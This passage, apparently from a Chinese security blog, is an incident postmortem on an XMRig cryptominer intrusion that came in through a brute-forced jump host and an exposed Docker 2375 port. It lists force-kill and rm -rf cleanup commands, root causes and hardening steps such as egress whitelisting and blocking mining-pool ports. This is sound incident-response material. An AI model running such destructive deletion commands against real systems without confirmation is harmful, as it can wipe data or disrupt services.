+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systemctl stop myapp.service
+</span></span><span style="display:flex;"><span>pkill -9 -f <span style="color:#e6db74">&#39;/var/tmp/.cache&#39;</span>
+</span></span><span style="display:flex;"><span>pkill -9 xmrig
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li><strong>删持久化</strong>：移除 crontab、systemd unit、rc.local 条目、隐藏目录。</li>
+</ol>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm -f /etc/cron.d/0systemd
+</span></span><span style="display:flex;"><span>systemctl disable --now myapp.service
+</span></span><span style="display:flex;"><span>rm -f /etc/systemd/system/myapp.service
+</span></span><span style="display:flex;"><span>rm -rf /var/tmp/.cache /tmp/.cache
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 修正 /etc/rc.local 中被追加的行</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>
+<p><strong>清登录与凭证</strong>：删除被爆破的弱口令账号、重置相关用户密码、回收泄露的 SSH key，并审查 <code>authorized_keys</code>。</p>
+</li>
+<li>
+<p><strong>业务恢复</strong>：确认 CPU 回落、矿池连接断开后，逐步放开限流，观察订单 API 延迟与 Redis 指标回归正常。</p>
+</li>
+<li>
+<p><strong>横向处置</strong>：对另外两台同症状主机重复上述步骤，并在跳板机强制开启 MFA、封禁 Docker 2375 端口。</p>
+</li>
+</ol>
+<h2 id="五根因分析"><a href="#%e4%ba%94%e6%a0%b9%e5%9b%a0%e5%88%86%e6%9e%90" class="header-anchor"></a>五、根因分析
+</h2><ul>
+<li><strong>直接原因</strong>：XMRig 木马以系统全部核心并行挖矿，抢占 CPU 调度，导致业务进程拿不到计算资源，P99 延迟飙升。</li>
+<li><strong>入侵根因</strong>：跳板机弱口令被爆破 + 测试机 Docker 2375 端口无鉴权暴露公网，攻击者据此拿到内网立足点并横向移动。</li>
+<li><strong>放大因素</strong>：失陷主机未对出向连接做白名单限制，木马能自由外联矿池；且缺乏主机级入侵检测（EDR/HIDS），攻击持续数天才被发现。</li>
+</ul>
+<h2 id="六预防措施"><a href="#%e5%85%ad%e9%a2%84%e9%98%b2%e6%8e%aa%e6%96%bd" class="header-anchor"></a>六、预防措施
+</h2><ul>
+<li><strong>收敛暴露面</strong>：Docker daemon 绝不开放 2375 无鉴权端口，确需远程管理走 TLS 双向认证或 SSH 隧道；非必要端口一律不对外开放。</li>
+<li><strong>口令与认证</strong>：跳板机、服务器禁用弱口令，强制 SSH key + MFA；定期用 <code>lynis</code>/<code>ssh-audit</code> 做基线核查。</li>
+<li><strong>出向白名单</strong>：生产服务器 egress 默认 DROP，仅放行 DNS、NTP、镜像与业务依赖的有限目标；矿池常见端口（3333/8080/14444 等）可在边界统一封禁。</li>
+<li><strong>主机入侵检测</strong>：部署 osquery / Wazuh / 云厂商 HIDS，对异常高 CPU、隐藏目录可执行文件、可疑 crontab/systemd 变更做实时告警。</li>
+<li><strong>最小权限与分区</strong>：业务以非 root 运行；<code>/tmp</code>、<code>/var/tmp</code> 挂载 <code>noexec,nosuid</code>，让下载到临时目录的恶意脚本无法直接执行。</li>
+<li><strong>应急准备</strong>：固化本文的&quot;查进程 → 找守护 → 断外联 → 杀进程 → 删持久化 → 改凭证 → 横向排查&quot;七步法为 SOP，并定期演练。</li>
+</ul>
+<h2 id="七总结"><a href="#%e4%b8%83%e6%80%bb%e7%bb%93" class="header-anchor"></a>七、总结
+</h2><p>这次事件从&quot;CPU 满载、业务变慢&quot;的表象，一步步还原出&quot;弱口令爆破 → Docker 端口暴露 → 内网横向 → XMRig 挖矿&quot;的完整链条。技术上的清理并不复杂——杀进程、删自启、断外联、改凭证即可；真正的教训在<strong>暴露面收敛与纵深防御</strong>：不要把信任建立在&quot;机器没公网 IP&quot;上，内网横向移动往往比想象中容易。把 egress 白名单、主机 IDS、<code>noexec</code> 临时分区这三道防线补上，下次同类攻击大概率会在落地前就被拦下。</p>
+
+</section>
+
+
+    <footer class="article-meta article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/">安全运维</a>
+        
+            <a href="/tags/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/">挖矿木马</a>
+        
+            <a href="/tags/xmrig/">XMRig</a>
+        
+            <a href="/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/">入侵排查</a>
+        
+            <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+
+        <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Zero Day Notes
+    </section>
+    
+    <section class="powerby">
+         <br />
+        
+    </section>
+</footer>
+
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+
+    
+
+            </main>
+        </div>
+        
+<script type="text/javascript" src="/ts/main.d00997a2f4a6ce525f496da0c3ae6ad392b0468b8a9024f23309fdfc75c67a35.js" defer></script>
+
+
+    </body>
+</html>
